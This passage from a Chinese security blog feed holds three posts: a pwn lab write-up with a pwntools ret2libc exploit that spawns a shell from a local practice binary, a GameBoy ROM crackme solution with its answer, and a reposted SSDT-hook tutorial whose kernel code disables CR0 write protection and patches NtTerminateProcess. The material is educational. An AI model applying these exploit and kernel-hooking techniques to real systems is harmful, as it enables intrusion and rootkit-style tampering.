alt="image-20240210125246324"></p><p>我们已经看到了puts和scanf了，我们可以利用这两个函数来创建一个完美的漏洞。我们的exp的编写基于以下的逻辑：我们可以控制该程序的流程，将尝试执行系统（“&#x2F;bin&#x2F;sh”）从而弹出一个shell。</p><p>因此我们需要完成以下几件事情：</p><p>   1.泄露puts的真实地址</p><p>   2.计算libc的基址</p><p>   3.计算system的地址</p><p>   4.找到包含&#x2F;bin&#x2F;sh字符串的libc的地址</p><p>   5.使用&#x2F;bin&#x2F;sh进行系统调用，并且拿到shell</p><p> 先来看看我们exp的框架（exploit1.py）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#Add</span></span><br><span class="line">puts_plt = </span><br><span class="line">puts_got = </span><br><span class="line">entry_point = </span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#open process</span></span><br><span class="line">    p = process(<span class="string">&quot;./megabeets_0x2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain = p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line">   payload = payload + ropchain</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">&quot;puts is at: 0x%x&quot;</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们需要填入的就是puts_plt , puts_got , entry_point 三个地址</p><p>我们将利用radare2找到这三个地址</p><p><img src="/.io//image-20240210133151857.png" alt="image-20240210133151857"></p><p>?v sym.imp.puts命令的意思是获取puts函数在PLT中的地址，接下来获取puts_20在GOT中的地址与程序入口</p><p><img src="/.io//image-20240210133348092.png" alt="image-20240210133348092"></p><p>填入exp，执行</p><p><img src="/.io//image-20240210133613652.png" alt="image-20240210133613652"></p><p>我们执行了三遍，可以看到每次执行后的puts的地址都会发生变化。因此我们不能提前预测地址。现在我们需要找到puts在libc中的偏移，然后计算lib的基址。之后我们根据基址然后使用对应的偏移来计算出system,exit,”&#x2F;bin&#x2F;sh”的真实地址。</p><p>Exp（exploit.py）的框架是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#Add</span></span><br><span class="line">puts_plt = </span><br><span class="line">puts_got = </span><br><span class="line">entry_point = </span><br><span class="line"></span><br><span class="line"><span class="comment">#Offsets</span></span><br><span class="line">offset_puts = </span><br><span class="line">offset_system = </span><br><span class="line">offset_exit = </span><br><span class="line">offset_str_bin_sh = </span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#open process</span></span><br><span class="line">    p = process(<span class="string">&quot;./megabeets_0x2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain = p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line">   payload = payload + ropchain</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">&quot;puts is at: 0x%x&quot;</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">&quot;libc base: 0x%x&quot;</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    exit_addr = libc_base + offset_exit</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">&quot;system is at: 0x%x&quot;</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;/bin/sh is at: 0x%x&quot;</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">&quot;exit is at: 0x%x&quot;</span> % exit_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#build 2nd payload</span></span><br><span class="line">    payload2 = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain2 = p32(system_addr)</span><br><span class="line">    ropchain2 += p32(exit_addr)</span><br><span class="line">    ropchain2 += p32(binsh_addr)</span><br><span class="line">    payload2 = payload2 + ropchain2</span><br><span class="line">    p.sendline(payload2)   </span><br><span class="line">    </span><br><span class="line">    log.success(<span class="string">&quot;Here comes the shell!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们接下来的任务就是使用radare2找到偏移量</p><p><img src="/.io//image-20240210134908119.png" alt="image-20240210134908119"></p><p><img src="/.io//image-20240210135734579.png" alt="image-20240210135734579"></p><p><img src="/.io//image-20240210135759122.png" alt="image-20240210135759122"></p><p>填充后，成功拿到shell</p><p><img src="/.io//image-20240210140034709.png" alt="image-20240210140034709"></p><p>我们回顾下这次实验中是如何pwn的：</p><p>   主要分为两个阶段。</p><p>   第一个阶段，我们需要：140字节的填充，PLT中puts的地址，入口点，GOT中puts的地址。</p><p>   目的：泄露puts的地址。通过多次执行，发现中put的地址是改变的，即我们事先不能预测它的地址，所以为了获取真实地址我们必须通过偏移量，基址进行计算得到。</p><p>   对应我们的脚本 exploit1.py</p><p>   第二个阶段，我们需要：140字节的填充，system@libc,exit@libc,&#x2F;bin&#x2F;sh地址</p><p>   对应我们的脚本exploit.py</p><p>   目的：计算偏移，基址获取关键函数的真实地址，从而系统调用拿到shell</p><p>   总结一下，关键的步骤：多次泄露puts的地址-》发现地址随机，无法事先预测地址-》计算偏移，基址来获取关键函数调用真实地址-》拿到shell</p><h2 id="进阶-1"><a href="#进阶-1" class="headerlink" title="进阶"></a>进阶</h2><p>本实验旨在通过radare2来解决GameBoy ROM挑战的一个项目：simple.gb</p><p>首先我们在radare2打开二进制文件，检查它的架构、格式（i命令给出关于二进制文件的信息，~是r2内部的grep命令）</p><p><img src="/.io//image-20240210141758683.png" alt="image-20240210141758683"></p><p>由上图可以看出这是一个GameBoy的ROM，那么在阅读了它的一些指令集之后我们该去完成这次挑战了</p><p>安装模拟器并测试，发现失败后有字符FAIL</p><p>回到kali，查看FAIL地址（izzq会打印出存在于整个二进制文件中的字符串）</p><p><img src="/.io//image-20240210141931919.png" alt="image-20240210141931919"></p><p>pd打印反汇编代码并查找对应的位置</p><p><img src="/.io//image-20240210142035016.png" alt="image-20240210142035016"></p><p>我们可以看到在0x2e4引用，所以我们搜索这个地址，并打印该函数：（s addr 用于定位到某个地址，pdf用于打印出反汇编函数）</p><p><img src="/.io//image-20240210142133980.png" alt="image-20240210142133980"></p><p>我们可以看到，radare2识别出我们的函数从0x274开始。在底部有一些比较操作，然后跳转到失败的消息或者其他消息（字符串在0x02ee），我们去那儿看看。（ps意思是打印字符串，@是一个临时搜索）</p><p><img src="/.io//image-20240210142348760.png" alt="image-20240210142348760"></p><p>我们找到了win</p><p>那么我们给0x274重命名为check_input，然后开始分析</p><p><img src="/.io//image-20240210142835655.png" alt="image-20240210142835655"></p><p>VV需要大写</p><p><img src="/.io//image-20240210142952910.png" alt="image-20240210142952910"></p><p>可以看到，函数结合了很多跳转和if条件语句</p><p>我们发现函数检查每个数字，并将其与正确的比较。在左边我们可以看到有效数字。让我们快速查看这些块。我们使用p在不同视图之间再次切换，直到达到常规图形模式。</p><p><img src="/.io//image-20240210143034616.png" alt="image-20240210143034616"></p><p>简单地看了一下，大概地明白程序的意思了：二进制程序检查是否每个位置上的数字都与特定的值相等。使用cmp imm命令按照这个顺序:3,7,5,1,9检查。</p><p><img src="/.io//image-20240210143414426.png" alt="image-20240210143414426"></p><p>再仔细分析汇编，</p><p>在第一个块中，0x4被移动到hl（ld指令)，而hl又移动到寄存器bc，然后bc中引用的值与0x3进行比较。bc指向我们的输入，因此此处的检查功能检查bc+4是否等于0x3。在下一个块中，我们可以看到返回到其原始值的bc现在增加了两次(Inc)（bc+2），它所引用的值与0x7进行了比较。在示例的最后一个块中，bc返回其初始值，然后递增一次，其引用值与0x5比较。</p><p>那么逻辑就应该是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span> (guess):   </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> guess[<span class="number">4</span>]==<span class="number">3</span> <span class="keyword">and</span> guess[<span class="number">2</span>]==<span class="number">7</span> <span class="keyword">and</span> guess[<span class="number">1</span>]==<span class="number">5</span> andguess[<span class="number">3</span>]==<span class="number">1</span> <span class="keyword">and</span> guess[<span class="number">0</span>]==<span class="number">9</span>:</span><br><span class="line"></span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;WIN!&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">           <span class="built_in">print</span> <span class="string">&quot;FAIL!&quot;</span></span><br></pre></td></tr></table></figure><p>由上述代码代码逻辑可以看出，输入的数字作为数组排列的话，真实顺序应该为95713</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSDTHook</title>
      <link href="/2024/02/06/SSDTHook/"/>
      <url>/2024/02/06/SSDTHook/</url>
      
        <content type="html"><![CDATA[<p><img src="/.io//o_211116025454_1-3.png" alt="img"></p><h1 id="SSDT-Hook底层原理介绍以及如何实现进程保护-知乎"><a href="#SSDT-Hook底层原理介绍以及如何实现进程保护-知乎" class="headerlink" title="SSDT Hook底层原理介绍以及如何实现进程保护 - 知乎 "></a><a href="https://zhuanlan.zhihu.com/p/328757029">SSDT Hook底层原理介绍以及如何实现进程保护 - 知乎 </a></h1><p><strong>本文为转载文章，点击标题跳转至原文。如转载有侵权行为，请告知删除。</strong></p><h2 id="SSDT-Hook效果图"><a href="#SSDT-Hook效果图" class="headerlink" title="SSDT Hook效果图"></a>SSDT Hook效果图</h2><p>加载驱动并成功Hook NtTerminateProcess函数：</p><p><img src="/.io//v2-c1e0e81982f9f20e3cd198211e67ec48_1440w.webp" alt="img"></p><p>当对 指定的进程进行保护后，尝试使用“任务管理器”结束进程的时候，会弹出“拒绝访问”的窗口，说明，我们的目的已经达到：</p><p><img src="/.io//v2-271a04987f195ef4a676e613942ec187_1440w.webp" alt="img"></p><h2 id="SSDT简介"><a href="#SSDT简介" class="headerlink" title="SSDT简介"></a>SSDT简介</h2><p>SSDT 的全称是 System Services Descriptor Table，系统服务描述符表。</p><p>这个表就是一个把 Ring3 的 Win32 API 和 Ring0 的内核 API 联系起来。</p><p>SSDT 并不仅仅只包含一个庞大的地址索引表，它还包含着一些其它有用的信息，诸如地址索引的基地址、服务函数个数等。</p><p>通过修改此表的函数地址可以对常用 Windows 函数及 API 进行 Hook，从而实现对一些关心的系统动作进行过滤、监控的目的。</p><p>一些 HIPS、防毒软件、系统监控、注册表监控软件往往会采用此接口来实现自己的监控模块。</p><h2 id="SSDT结构"><a href="#SSDT结构" class="headerlink" title="SSDT结构"></a>SSDT结构</h2><p>SSDT即系统服务描述符表，它的结构如下(参考《Undocument Windows 2000 Secretes》第二章):</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// KSYSTEM_SERVICE_TABLE 和 KSERVICE_TABLE_DESCRIPTOR</span><br><span class="line">// 用来定义 SSDT 结构</span><br><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE</span><br><span class="line">&#123;</span><br><span class="line">    PULONG  ServiceTableBase;                               // SSDT (System Service Dispatch Table)的基地址</span><br><span class="line">    PULONG  ServiceCounterTableBase;                        // 用于 checked builds, 包含 SSDT 中每个服务被调用的次数</span><br><span class="line">    ULONG   NumberOfService;                                // 服务函数的个数, NumberOfService * 4 就是整个地址表的大小</span><br><span class="line">    ULONG   ParamTableBase;                                 // SSPT(System Service Parameter Table)的基地址</span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line">typedef struct _KSERVICE_TABLE_DESCRIPTOR</span><br><span class="line">&#123;</span><br><span class="line">    KSYSTEM_SERVICE_TABLE   ntoskrnl;                       // ntoskrnl.exe 的服务函数</span><br><span class="line">    KSYSTEM_SERVICE_TABLE   win32k;                         // win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)</span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed1;</span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed2;</span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>内核中有两个系统服务描述符表,一个是KeServiceDescriptorTable(由ntoskrnl.exe导出),一个是KeServieDescriptorTableShadow(没有导出)。</p><p>两者的区别是，KeServiceDescriptorTable仅有ntoskrnel一项，KeServieDescriptorTableShadow包含了ntoskrnel以及win32k。一般的Native API的服务地址由KeServiceDescriptorTable分派，gdi.dll&#x2F;user.dll的内核API调用服务地址由KeServieDescriptorTableShadow分派。还有要清楚一点的是win32k.sys只有在GUI线程中才加载，一般情况下是不加载的，所以要Hook KeServieDescriptorTableShadow的话，一般是用一个GUI程序通过IoControlCode来触发(想当初不明白这点，蓝屏死机了N次都想不明白是怎么回事)。</p><h2 id="SSDT-HOOK原理"><a href="#SSDT-HOOK原理" class="headerlink" title="SSDT HOOK原理"></a>SSDT HOOK原理</h2><p>关于内核 Hook 有多种类型，下面也给出一副图示：</p><p><img src="/.io//v2-7f181a129a041130b36c3442c06cac53_1440w.webp" alt="img"></p><p>SSDT HOOK只是其中一种Hook技术，本篇文章主要讲解SSDT Hook的使用。</p><p>SSDT HOOK原理图</p><p><img src="/.io//v2-f8262484128809e6848146735bf0270a_1440w.webp" alt="img"></p><p>通过Kernel Detective工具，我们可以发现，SSDT Hook前后，NtTerminateProcess的当前地址会发生变化，其中，变化后的当前地址：0xF885A110为我们自定义的Hook函数（即：HookNtTerminateProcess）的地址。这样，以后每次执行NtTerminateProcess的时候，就会根据执行“当前地址”所指向的函数了，这也就是SSDT Hook的原理。</p><p>另外，看雪的”堕落天才”写的不错，我直接引用下：</p><p>SSDT HOOK 的原理其实非常简单，我们先实际看看KeServiceDescriptorTable是什么样的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; dd KeServiceDescriptorTable</span><br><span class="line">   8055ab80  804e3d20 00000000 0000011c 804d9f48</span><br><span class="line">   8055ab90  00000000 00000000 00000000 00000000</span><br><span class="line">   8055aba0  00000000 00000000 00000000 00000000</span><br><span class="line">   8055abb0  00000000 00000000 00000000 00000000 </span><br></pre></td></tr></table></figure><p>　　如上,80587691 805716ef 8057ab71 80581b5c 这些就是系统服务函数的地址了。比如当我们在ring3调用OpenProcess时，进入sysenter的ID是0x7A(XP SP2)，然后系统查KeServiceDescriptorTable，大概是这样KeServiceDescriptorTable.ntoskrnel.ServiceTableBase(804e3d20) + 0x7A * 4 &#x3D; 804E3F08,然后804E3F08 -&gt;8057559e 这个就是OpenProcess系统服务函数所在,我们再跟踪看看:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; u 8057559e</span><br><span class="line">    nt!NtOpenProcess:</span><br><span class="line">    8057559e 68c4000000      push    0C4h</span><br><span class="line">    805755a3 6860b54e80      push    offset nt!ObReferenceObjectByPointer+0x127 (804eb560)</span><br><span class="line">    805755a8 e8e5e4f6ff      call    nt!InterlockedPushEntrySList+0x79 (804e3a92)</span><br><span class="line">    805755ad 33f6            xor     esi,esi</span><br></pre></td></tr></table></figure><p>　　原来8057559e就是NtOpenProcess函数所在的起始地址。<br>嗯，如果我们把8057559e改为指向我们函数的地址呢？比如 MyNtOpenProcess，那么系统就会直接调用MyNtOpenProcess，而不是原来的NtOpenProcess了。这就是SSDT HOOK 原理所在。</p><h2 id="Hook前准备"><a href="#Hook前准备" class="headerlink" title="Hook前准备"></a>Hook前准备</h2><p>我们要修改SSDT表，首先这个表必须是可写的，但在xp以后的系统中他都是只读的，三个办法来修改内存保护机制</p><p>(1) 更改注册表</p><p>恢复页面保护：HKLM\SYSTEM\CurrentControlset\Control\Session Manger\Memory Management\EnforceWriteProtection&#x3D;0</p><p>去掉页面保护：HKLM\SYSTEM\CurrentControlset\Control\Session Manger\Memory Management\DisablePagingExecutive&#x3D;1</p><p>(2)改变CR0寄存器的第1位</p><p>Windows对内存的分配，是采用的分页管理。其中有个CR0寄存器，如下图：</p><p><img src="/.io//v2-3cfab14509d49a815262cf97aecd5a89_1440w.webp" alt="img"></p><p>其中第1位叫做保护属性位，控制着页的读或写属性。如果为1，则可以读&#x2F;写&#x2F;执行；如果为0，则只可以读&#x2F;执行。</p><p>SSDT，IDT的页属性在默认下都是只读，可执行的，但不能写。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//设置为不可写</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        _asm</span><br><span class="line">        &#123;</span><br><span class="line">            mov eax, cr0 </span><br><span class="line">            <span class="keyword">or</span>  eax, <span class="number">10000</span>h </span><br><span class="line">            mov cr0, eax </span><br><span class="line">            sti </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;DisableWrite执行失败！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置为可写</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        _asm</span><br><span class="line">        &#123;</span><br><span class="line">            cli</span><br><span class="line">            mov eax,cr0</span><br><span class="line">            <span class="keyword">and</span> eax,<span class="keyword">not</span> <span class="number">10000</span>h <span class="comment">//and eax,0FFFEFFFFh</span></span><br><span class="line">            mov cr0,eax</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;EnableWrite执行失败！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）通过Memory Descriptor List(MDL)</p><p>具体做法可以google下，这里就不介绍了</p><h2 id="如何获得SSDT中函数的地址呢？"><a href="#如何获得SSDT中函数的地址呢？" class="headerlink" title="如何获得SSDT中函数的地址呢？"></a>如何获得SSDT中函数的地址呢？</h2><p>这里主要使用了两个宏：</p><p>①获取指定服务的索引号：SYSCALL_INDEX</p><p>②获取指定服务的当前地址：SYSCALL_FUNCTION</p><p>这两个宏的具体定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据 ZwServiceFunction 获取 ZwServiceFunction 在 SSDT 中所对应的服务的索引号 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_INDEX(ServiceFunction) (*(PULONG)((PUCHAR)ServiceFunction + 1)) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//根据ZwServiceFunction 来获得服务在 SSDT 中的索引号，然后再通过该索引号来获取ntServiceFunction的地址 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_FUNCTION(ServiceFunction) KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[SYSCALL_INDEX(ServiceFunction)]</span></span><br></pre></td></tr></table></figure><h2 id="SSDT-Hook流程"><a href="#SSDT-Hook流程" class="headerlink" title="SSDT Hook流程"></a>SSDT Hook流程</h2><p><img src="/.io//v2-52266d8f40e6bf1348238108d65b8092_1440w.webp" alt="img"></p><p><img src="/.io//v2-3c40829a650f96ab57be6975d78f8601_1440w.webp" alt="img"></p><p>在驱动的入口函数中(DriverEntry),对未进行SSDT Hook前的SSDT表进行了备份（用一个数组保存），备份时，一个索引号对应一个当前地址，如上图所示。</p><p>这样，在解除Hook的时候，就可以从全局数组中根据索引号获取未Hook前的服务名的当前地址，以便将原来的地址写回去，这一步很重要。</p><p>当用户选择保护某个进程的时候，就会通过DeviceIoControl发送一个IO_INSERT_PROTECT_PROCESS控制码给驱动程序，此时驱动程序会生成一个IRP:IRP_MJ_DEVICE_CONTROL,我们事先已经在驱动程序中为</p><p>IRP_MJ_DEVICE_CONTROL指定了一个派遣函数：SSDTHook_DispatchRoutine_CONTROL。在该派遣函数中：我们通过获取控制码（是保护进程还是取消保护进程），如果是要保护某个进程，则通过<br>DeviceIoControl的第3个参数将要保护的进程的pid传递给驱动程序。然后在派遣函数SSDTHook_DispatchRoutine_CONTROL中从缓冲区中读取该pid，如果是要保护进程，则将要“保护进程”的pid添加到一个数组中，如果是要“取消保护进程”，则将要取消保护的进程PID从数组中移除。</p><p>在Hook NtTermianteProcess函数后，会执行我们自定义的函数：HookNtTerminateProcess，在HookNtTerminateProcess函数中，我们判断当前进程是否在要保护的进程数组中，如果该数组中存在该pid，则我们返回一个“权限不够”的异常，如果进程保护数组中不存在该pid，则直接调用原来 SSDT 中的 NtTerminateProcess 来结束进程。</p><h2 id="SSDT-Hook实现进程保护"><a href="#SSDT-Hook实现进程保护" class="headerlink" title="SSDT Hook实现进程保护"></a>SSDT Hook实现进程保护</h2><p>有了上面的理论基础之后，接下来可以谈谈SSDT Hook实现进程保护的具体实现了。</p><p>实现进程保护，可以Hook NtTermianteProcess，另外也可以Hook NtOpenProcess，这里，我是Hook NtTermianteProcess。</p><p>SSDT Hook原理一节中已经说过，SSDT Hook原理的本质是：自定义一个函数（HookNtTerminateProcess），让系统服务NtTermianteProcess的当前地址指向我们自定义函数地址。</p><p>这一步工作是在驱动入口函数中执行的。当驱动加载的时候，将自定义函数的地址写入SSDT表中NtTermianteProcess服务的当前地址：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> // 实现 Hook 的安装，主要是在 SSDT 中用 newService 来替换掉 oldService</span><br><span class="line">NTSTATUS InstallHook(ULONG oldService, ULONG newService)</span><br><span class="line">&#123;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        ULONG uOldAttr = 0;        </span><br><span class="line">        EnableWrite();    //去掉页面保护    </span><br><span class="line">        KdPrint((&quot;伪造NtTerminateProcess地址: %x\n&quot;,(int)newService));</span><br><span class="line">        //KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[SYSCALL_INDEX(oldService)] = newService;</span><br><span class="line">        SYSCALL_FUNCTION(oldService) = newService;//</span><br><span class="line">        DisableWrite();    //恢复页面保护</span><br><span class="line">        return STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(1)</span><br><span class="line">    &#123;</span><br><span class="line">        KdPrint((&quot;安装Hook失败!&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是：在Hook前，需要去掉内存的页面保护属性，Hook后，需要回复内存的页面保护属性。</p><p>HookNtTerminateProcess函数的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 